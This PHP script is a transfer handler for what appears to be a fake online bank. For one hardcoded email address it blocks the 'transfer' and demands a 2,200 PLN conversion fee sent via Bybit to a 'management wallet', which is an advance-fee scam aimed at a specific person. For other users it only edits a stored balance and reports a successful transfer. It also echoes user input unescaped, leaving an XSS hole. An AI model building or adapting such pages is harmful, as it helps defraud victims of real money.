<?php
require 'config.php';

if (!isset($_SESSION['user'])) {
  header("Location: login.html");
  exit;
}

$user = $_SESSION['user'];

if ($user['email'] === 'keniol9822@op.pl') {
  echo "<div style='padding: 20px; font-family: sans-serif; background: #ffe5e5; border: 1px solid #cc0000;'>
    <h3 style='color: #cc0000;'>Transfer Blocked</h3>
    <p>Dear {$user['fullname']}, your transfer cannot be processed.</p>
    <p>You must pay a <strong>Pending Currency Conversion Fee of 2,200 PLN</strong> to continue.</p>
    <p>Please send this via <strong>Bybit</strong> to the management wallet:</p>
    <p><strong>bybit-wallet@usb-payments.com</strong></p>
    <p>Once confirmed, transfers will be re-enabled.</p>
  </div>";
  exit;
}

$recipient = $_POST['recipient_name'];
$bank = $_POST['bank_name'];
$swift = $_POST['swift'];
$iban = $_POST['iban'];
$amount = (float) $_POST['amount'];

if ($user['balance'] < $amount) {
  die("Insufficient balance");
}

$conn->query("UPDATE users SET balance = balance - $amount WHERE id = {$user['id']}");
$_SESSION['user']['balance'] -= $amount;

echo "✅ Transfer of $$amount to $recipient at $bank was successful.";
?>
